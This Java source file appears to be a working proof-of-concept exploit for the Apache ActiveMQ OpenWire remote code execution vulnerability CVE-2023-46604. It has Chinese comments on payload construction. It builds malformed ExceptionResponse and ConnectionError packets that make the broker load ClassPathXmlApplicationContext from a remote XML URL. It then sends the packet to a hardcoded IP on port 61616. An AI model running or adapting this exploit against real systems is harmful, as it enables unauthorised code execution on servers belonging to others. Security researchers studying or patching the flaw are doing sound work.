package cve;

import java.io.*;
import java.net.Socket;

import org.springframework.context.support.ClassPathXmlApplicationContext;
import org.apache.activemq.command.ExceptionResponse;
import org.apache.activemq.openwire.v9.BaseDataStreamMarshaller;
import org.apache.activemq.openwire.v9.ExceptionResponseMarshaller;
import org.apache.activemq.openwire.OpenWireFormat;
import org.apache.activemq.transport.tcp.TcpTransport;

/**
 * 漏洞名称：Apache ActiveMQ 远程代码执行漏洞
 * 漏洞链接：https://ti.qianxin.com/vulnerability/detail/315991
 * payload构造思路，输入流需要什么就提供什么，非标准的openwire协议格式
 */
public class CVE_2023_46604 {


    public static void useExceptionResponseMarshaller(String file) throws IOException {
        DataOutputStream out = new DataOutputStream(new BufferedOutputStream(new FileOutputStream(file)));
        out.writeInt(1);//size不大于100000即可
        out.writeByte(31);//datatype
        out.writeInt(1);//CommandId
        out.writeBoolean(true);//ResponseRequired
        out.writeInt(1);//CorrelationId
        out.writeBoolean(true);//让最后判断表达式为否
        out.writeBoolean(true);//让可以读取UTF
        out.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");//classname
        out.writeBoolean(true);//让可以读取UTF
        out.writeUTF("http://127.0.0.1/calc.xml");//message
        out.close();
    }

    public static void useConnectionErrorMarshaller(String file) throws IOException {
        DataOutputStream out = new DataOutputStream(new BufferedOutputStream(new FileOutputStream(file)));
        out.writeInt(1);//size小于100000即可
        out.writeByte(16);//datatype
        out.writeInt(1);//CommandId
        out.writeBoolean(true);//ResponseRequired
        out.writeBoolean(true);//让最后判断表达式为否
        out.writeBoolean(true);//让可以读取UTF
        out.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");//classname
        out.writeBoolean(true);//让可以读取UTF
        out.writeUTF("http://127.0.0.1/calc.xml");//message
        out.close();
    }

    public static void main(String[] args) throws IOException {

        String file = "test.txt";
        useExceptionResponseMarshaller(file);
        DataInputStream in = new DataInputStream(new BufferedInputStream(new FileInputStream(file)));
        Socket socket =new Socket("10.58.120.201",61616);
        OutputStream os = socket.getOutputStream(); //输出流
        int length = in.available();
        byte[] buf = new byte[length];
        in.readFully(buf);
        os.write(buf);
        in.close();
        socket.close();
    }
}